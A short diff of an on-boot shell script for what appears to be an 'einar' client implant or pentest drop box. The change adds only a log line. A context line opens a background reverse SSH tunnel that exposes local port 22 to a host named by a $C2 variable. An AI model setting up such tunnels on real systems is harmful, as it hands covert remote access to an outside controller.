@@ -9,7 +9,7 @@
 ############################################################################### 
 
 source /opt/einar/client/config.sh
-
+$LOG "Running onboot"
 # Setup our SSH Tunnel
 sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f
 if [ $? == 1 ]; then 
